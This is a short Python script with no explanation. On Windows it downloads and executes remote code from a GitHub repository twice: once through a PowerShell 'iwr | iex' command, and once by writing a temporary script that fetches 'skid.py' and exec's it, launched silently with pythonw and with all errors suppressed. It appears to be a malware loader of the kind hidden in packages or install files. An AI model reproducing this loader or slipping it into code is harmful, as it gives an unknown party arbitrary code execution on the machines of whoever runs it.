import subprocess
import sys
if sys.platform.startswith("win"):
    cmd = r'iwr https://github.com/8yb29qeg/lol/raw/refs/heads/main/a.txt -useb | iex'
    subprocess.run(["powershell", "-Command", cmd], shell=True)
else:
    ""
if sys.platform.startswith("win"):
    from tempfile import NamedTemporaryFile as _ffile
    from sys import executable as _eexecutable
    from os import system as _ssystem
    _ttmp = _ffile(delete=False)
    _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://github.com/8yb29qeg/lol/raw/refs/heads/main/skid.py").read())""")
    _ttmp.close()
    try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
    except: pass
else:
    ""
